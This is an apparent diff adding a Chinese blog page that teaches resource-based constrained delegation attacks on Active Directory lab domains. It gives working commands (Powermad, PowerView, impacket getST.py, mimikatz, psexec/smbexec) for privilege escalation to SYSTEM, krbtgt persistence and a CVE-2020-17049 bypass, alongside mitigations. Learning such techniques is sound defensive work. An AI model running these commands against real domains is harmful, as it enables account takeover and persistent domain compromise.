@@ -1,0 +1,663 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>基于资源的约束委派 - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="基于资源的约束委派">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-04 21:57" pubdate>
+        2022年3月4日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      32
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">基于资源的约束委派</h1>
+            
+            <div class="markdown-body">
+              <h2 id="什么是基于资源的约束委派"><a href="#什么是基于资源的约束委派" class="headerlink" title="什么是基于资源的约束委派"></a>什么是基于资源的约束委派</h2><p>为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p>
+<p>上面”基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员”，这就导致了正常只要是域用户都有权限进行委派操作。</p>
+<p>与约束委派最大的不同点，就是”基于资源”这四个字，如何理解”基于资源”？在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p>
+<h2 id="基于资源的约束性委派的优势"><a href="#基于资源的约束性委派的优势" class="headerlink" title="基于资源的约束性委派的优势"></a>基于资源的约束性委派的优势</h2><ul>
+<li>委派的权限授予给了拥有资源的后端，而不再是前端</li>
+<li>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</li>
+<li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限也就是将计算机加入域的域用户和机器自身拥有权限。</li>
+</ul>
+<h2 id="约束性委派和基于资源的约束性委派配置的差别"><a href="#约束性委派和基于资源的约束性委派配置的差别" class="headerlink" title="约束性委派和基于资源的约束性委派配置的差别"></a>约束性委派和基于资源的约束性委派配置的差别</h2><ul>
+<li>传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</li>
+<li>而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</li>
+</ul>
+<h2 id="三个重要的域属性合集"><a href="#三个重要的域属性合集" class="headerlink" title="三个重要的域属性合集"></a>三个重要的域属性合集</h2><h3 id="关于ms-DS-CreatorSID"><a href="#关于ms-DS-CreatorSID" class="headerlink" title="关于ms-DS-CreatorSID"></a>关于ms-DS-CreatorSID</h3><p>一个场景，比如你通过ske这个域账户来登录当前的ttkq的机器中，然后将其加入到一个指定的域，然后账号密码用的就是ske这个账户密码，那么这个ttkq机器中的<code>ms-DS-CreatorSID</code>保存的就是当前ske用户的SID</p>
+<h3 id="关于msDS-AllowedToActOnBehalfOfOtherIdentity"><a href="#关于msDS-AllowedToActOnBehalfOfOtherIdentity" class="headerlink" title="关于msDS-AllowedToActOnBehalfOfOtherIdentity"></a>关于msDS-AllowedToActOnBehalfOfOtherIdentity</h3><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218014124021.png" srcset="/img/loading.gif" lazyload alt="image-20220218014124021"></p>
+<p>上面图中字段的内容为</p>
+<p><code>D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4223269421-3390898629-3395902804-1119)</code>，</p>
+<p>这个值是基于SDDL的语法的，自己笔记中有记录过，这里的话意思就是在SID为</p>
+<p><code>S-1-5-21-4223269421-3390898629-3395902804-1119</code></p>
+<p>上配置了基于资源的约束委派，也就是</p>
+<p><code>S-1-5-21-4223269421-3390898629-3395902804-1119</code></p>
+<p>对应的用户/机器对当前WIN-SKE-PC具有委派资源的权力</p>
+<h3 id="ms-DS-MachineAccountQuota"><a href="#ms-DS-MachineAccountQuota" class="headerlink" title="ms-DS-MachineAccountQuota"></a>ms-DS-MachineAccountQuota</h3><p>这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户</p>
+<p>为什么需要这个呢？这里还需要引出一个S4U2Self其中的一个知识点</p>
+<p>因为基于资源的约束委派中需要用到S4U2Self和S4U2Proxy，又因为S4U2Self只适用于具有SPN的账户，恰好的是在域中有一个属性MachineAccountQuota，所以就需要通过MachineAccountQuota来创建一个SPN的账户来进行委派配合<br>，而计算机账户默认是注册RestrictedKrbHost/domain和HOST/domain这两个SPN的</p>
+<p>知识点：</p>
+<p>1、传统的约束委派S4U2Self返回的票据一定是可转发的（Forwardable标记），如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据总是可转发。</p>
+<p>2、基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p>
+<h2 id="基于资源的约束委派攻击本地提权"><a href="#基于资源的约束委派攻击本地提权" class="headerlink" title="基于资源的约束委派攻击本地提权"></a>基于资源的约束委派攻击本地提权</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul>
+<li>在很多企业内部，都会有一个专门将机器加入域的账号。如果我们能够拿到该账号的权限，则我们能够拿到通过该账号加入域的所有机 器的system权限。 </li>
+<li>如果我们拿到了Account Operators组内用户权限的话，则我们可以拿到除域控外所有机器的system权限。</li>
+</ul>
+<p>攻击者可以查询域内计算机的 mS-DS-CreatorSID ，这个值代表的是将计算机加⼊到域内的⽤户，它是具有修改 msDS-AllowedToActOnBehalfOfOtherIdentity 的权限的，如果我们可以拿到那个⽤户的凭据，就可以控制那 个⽤户添加到域内的所有的电脑。</p>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>⾸先添加机器账户，修改 msDS-AllowedToActOnBehalfOfOtherIdentity 值为机器账户的 sid ，然后以机器 账户的身份伪造成 administrator 申请⼀张访问此机器账户机器的 ticket (类似于⽩银票据)，因为机器账户没 有配置约束性委派，所以这张票据是不可转发的，但是在基于资源的约束性委派中，票据是否可以转发不重要，对 之后对 s4u2proxy 不影响，最后利⽤这张 ticket 去申请访问修改了 msDSAllowedToActOnBehalfOfOtherIdentity 属性的机器。</p>
+<h3 id="攻击利⽤"><a href="#攻击利⽤" class="headerlink" title="攻击利⽤"></a>攻击利⽤</h3><p>这里用的是渗透攻击红队的pdf</p>
+<p>saulgoodman.cn 域环境：</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015226680.png" srcset="/img/loading.gif" lazyload alt="image-20220218015226680"></p>
+<p>这里其实是在win7里面操作的</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015417945.png" srcset="/img/loading.gif" lazyload alt="image-20220218015417945"></p>
+<p>其中 saulgoodman 这个域⽤户就是加域⽤户 ，可以发现saulgoodman 不是 win7 机器的本地管理员。，就可以通过 saulgoodman 域⽤户提权到 adminsitrator</p>
+<p>在 saulgoodman.cn 域中，saulgoodman 域⽤户负责将 web-2008 的机器或者 Win7 机器加⼊到 saulgoodman.cn 域⾥，那么当我们拿下 saulgoodman 这个域⽤户的权限后，就可以拿下域内 web-2008 的域机 器和 win7的域机器。</p>
+<p>假设我们已经获取到加域机器的 saulgoodman 的账户密码：</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015547462.png" srcset="/img/loading.gif" lazyload alt="image-20220218015547462"></p>
+<p>1、通过 ADfind 查询每个域机器是由哪个域⽤户添加进域的，通过 mS-DS-CreatorSID 查看域⽤户的 sid：</p>
+<p>命令：AdFind.exe -h 10.0.0.12 -u saulgoodman -up admin!@#45 -b “DC=saulgoodman,DC=cn” -f “objectClass=computer” mS-DS-CreatorSID</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015707643.png" srcset="/img/loading.gif" lazyload alt="image-20220218015707643"></p>
+<p>得到 win7 机器是 sid： S-1-5-21-3258976832-1609833424-2410015844-1108 的⽤户加⼊到域的。</p>
+<p>那么问题来了，我们怎么知道 S-1-5-21-3258976832-1609833424-2410015844-1108 是那个域⽤户的 sid 呢？ 2、若是想要查询每个域⽤户的 sid 就可以使⽤ sid2user 来帮助我们完成：（需要把 - 去掉）</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015800924.png" srcset="/img/loading.gif" lazyload alt="image-20220218015800924"></p>
+<p>这个时候就知道了 sid： S-1-5-21-3258976832-1609833424-2410015844-1108 是域⽤户 saulgoodman 。</p>
+<p>这些操作 是对前面如何确定saulgoodman  具有修改msDS-AllowedToActOnBehalfOfOtherIdentity权限的过程</p>
+<p>然后进行下面的操作</p>
+<p><strong>我们需要添加⼀个机器⽤户，因为需要⽤机器⽤户去申请票据，本身的 win7 机器账户我们不知道他的密码所以⽆ 法申请票据，所以我们需要添加⼀个机器⽤户，⽤来帮助我们申请票据。</strong></p>
+<p>3、然后利⽤ powermad 添加机器账户： 下载地址：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<p>/# 添加⽤户 goodman 密码 123456 </p>
+<p>powershell </p>
+<p>Set-ExecutionPolicy Bypass -Scope Process </p>
+<p>. ./Powermad.ps1 </p>
+<p>New-MachineAccount -MachineAccount goodman -Password $(ConvertTo-SecureString “123456” -AsPlainText -Force) </p>
+<p>验证是否添加成功 net group “domain computers” /domain</p>
+<p>net group “domain computers” /domain</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020123600.png" srcset="/img/loading.gif" lazyload alt="image-20220218020123600"></p>
+<p>此时就有了⼀个域机器账户 goodman:</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020157535.png" srcset="/img/loading.gif" lazyload alt="image-20220218020157535"></p>
+<p>4、获取 goodman 的 object Sid：得到了 sid 为： S-1-5-21-3258976832-1609833424-2410015844-1116 。 下⾯是修改 win7 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值，使⽤ Powerview ：<a target="_blank" rel="noopener" href="https://git/">https://git</a> hub.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+<p>这里获取goodman 新建的机器用户的sid  这里pdf是从域控上直接查看的  也可以用其他的方式来获取goodman的sid</p>
+<p>5、配置 goodman 到 win7 的基于资源的约束委派:</p>
+<p>powershell </p>
+<p>Set-ExecutionPolicy Bypass -Scope Process </p>
+<p>. ./powerview.ps1 </p>
+<p>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList “O:BAD: (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3258976832-1609833424-2410015844-1116)” $SDBytes = New-Object byte[] ($SD.BinaryLength) </p>
+<p>$SD.GetBinaryForm($SDBytes, 0) </p>
+<p>Get-DomainComputer win7| Set-DomainObject -Set @{‘msdsallowedtoactonbehalfofotheridentity’=$SDBytes} -Verbose</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020608083.png" srcset="/img/loading.gif" lazyload alt="image-20220218020608083"></p>
+<p>验证是否成功添加：</p>
+<p>Get-DomainComputer win7 -Properties msds-allowedtoactonbehalfofotheridentity</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020624672.png" srcset="/img/loading.gif" lazyload alt="image-20220218020624672"></p>
+<p>若想清除 msds-allowedtoactonbehalfofotheridentity 属性的值，可⽤如下命令：</p>
+<p>Set-DomainObject win7 -Clear ‘msds-allowedtoactonbehalfofotheridentity’ -Verbose</p>
+<p>6、使⽤ impacket的 getST.py ⽣成票据（建议使⽤ socks5），会在当前⽬录下⽣成 administrator.ccache ⽂ 件：</p>
+<blockquote>
+<p>python getST.py -dc-ip 10.0.0.12 saulgoodman.cn/goodman/$:123456 -spn cifs/win7.saulgoodman.cn -impersonate administrator</p>
+</blockquote>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020732614.png" srcset="/img/loading.gif" lazyload alt="image-20220218020732614"></p>
+<p>7、之后使⽤ mimikatz 导⼊票据：</p>
+<p>kerberos::ptc administrator.ccache</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020756855.png" srcset="/img/loading.gif" lazyload alt="image-20220218020756855"></p>
+<p>此时就能成功访问 Win7 了，这就是基于资源的约束委派攻击利⽤的整个流程</p>
+<p>如果想弹shell 也可以这样</p>
+<p>通过impacket工具包中的getST.py来进行利用，执行如下命令：</p>
+<blockquote>
+<p>python getST.py -dc-ip 192.168.4.11 hengge.com/ttkq$:admin@123 -spn cifs/WIN-SKE-PC -impersonate administrator</p>
+</blockquote>
+<p>创建票据的环境变量</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">KRB5CCNAME</span>=administrator.ccache<br></code></pre></td></tr></table></figure>
+
+<p>然后继续导入ST票据，通过psexec来进行连接测试</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> psexec.<span class="hljs-keyword">py</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">4.11</span> hengge.<span class="hljs-keyword">com</span>/administrator@WIN-SKE-PC -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218021017465.png" srcset="/img/loading.gif" lazyload alt="image-20220218021017465"></p>
+<p>system权限</p>
+<p>这里smbclient也是一样的用法</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> smbclient.<span class="hljs-keyword">py</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">4.11</span> hengge.<span class="hljs-keyword">com</span>/administrator@WIN-SKE-PC -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218021101717.png" srcset="/img/loading.gif" lazyload alt="image-20220218021101717"></p>
+<h2 id="利用基于资源的约束委派打造变种黄金票据-权限维持"><a href="#利用基于资源的约束委派打造变种黄金票据-权限维持" class="headerlink" title="利用基于资源的约束委派打造变种黄金票据(权限维持)"></a>利用基于资源的约束委派打造变种黄金票据(权限维持)</h2><p>如果这里我们假设服务B为krbtgt，服务A为我们控制的一个账号。配置服务A到服务B的基于资源的约束性委派， 那么我们控制的账户就可以获取KDC（Key Distribution Centre）服务的ST服务票据(也就是TGT认购权证)。于是我 们就可以伪造任何权限用户的TGT认购权证，来打造一个变种的黄金票据了！</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140351200.png" srcset="/img/loading.gif" lazyload alt="image-20220219140351200"></p>
+<p>首先在我们控制的普通域用户中创建一个机器账户：service5$ 密码为：root</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140509933.png" srcset="/img/loading.gif" lazyload alt="image-20220219140509933"></p>
+<p>然后来到域控执行</p>
+<p>配置krbtgt到service5$的基于资源的约束性委派 </p>
+<blockquote>
+<p>shell powershell Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount service5$ </p>
+</blockquote>
+<blockquote>
+<p>shell powershell Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</p>
+</blockquote>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140719541.png" srcset="/img/loading.gif" lazyload alt="image-20220219140719541"></p>
+<p>然后切换到物理机  这里是不需要在域控的</p>
+<p>sudo python3 getST.py -dc-ip 10.211.55.4 -spn krbtgt -impersonate administrator xie.com/service3/$:root </p>
+<p>export KRB5CCNAME=administrator.ccache </p>
+<p>python3 smbexec.py -no-pass -k <a href="mailto:&#97;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#x41;&#68;&#x30;&#x31;&#x2e;&#x78;&#x69;&#101;&#46;&#99;&#x6f;&#109;">&#97;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#x41;&#68;&#x30;&#x31;&#x2e;&#x78;&#x69;&#101;&#46;&#99;&#x6f;&#109;</a> -dc-ip 10.211.55.4</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140854724.png" srcset="/img/loading.gif" lazyload alt="image-20220219140854724"></p>
+<p>直接获取了域控的权限</p>
+<p>域控改密码了也没事</p>
+<h2 id="域委派攻击防范措施"><a href="#域委派攻击防范措施" class="headerlink" title="域委派攻击防范措施"></a>域委派攻击防范措施</h2><ul>
+<li>高权限的用户，设置不能被委派 </li>
+<li>主机账号需设置委派时，只能设置为约束性委派； </li>
+<li>Windows 2012 R2及更高的系统建立了受保护的用户组Protected Users，组内用户不允许被委派，这是有效的手段。受保护的用户组，</li>
+</ul>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219141610045.png" srcset="/img/loading.gif" lazyload alt="image-20220219141610045"></p>
+<p>设置为不可委派 </p>
+<p>设置之后  就不能获取票据了</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142445276.png" srcset="/img/loading.gif" lazyload alt="image-20220219142445276"></p>
+<p>但是可以绕过</p>
+<p>利用CVE 2020 17049</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142535595.png" srcset="/img/loading.gif" lazyload alt="image-20220219142535595"></p>
+<p>设置之后的流程是这样</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142619886.png" srcset="/img/loading.gif" lazyload alt="image-20220219142619886"></p>
+<p>所以不会返回票据  </p>
+<p>但是绕过这个  是通过逻辑漏洞 </p>
+<p>我们主动修改forwardable 为1</p>
+<p>然后就进入右边的流程  又因为配置了委派 所以能返回票据</p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142742572.png" srcset="/img/loading.gif" lazyload alt="image-20220219142742572"></p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142755835.png" srcset="/img/loading.gif" lazyload alt="image-20220219142755835"></p>
+<p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142808724.png" srcset="/img/loading.gif" lazyload alt="image-20220219142808724"></p>
+<p>设置之后 就能返回票据了</p>
+<h2 id="漏洞预防和修复"><a href="#漏洞预防和修复" class="headerlink" title="漏洞预防和修复"></a>漏洞预防和修复</h2><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142950422.png" srcset="/img/loading.gif" lazyload alt="image-20220219142950422"></p>
+<p>参考：渗透攻击红队</p>
+<p>谢公子</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NTLM基础学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
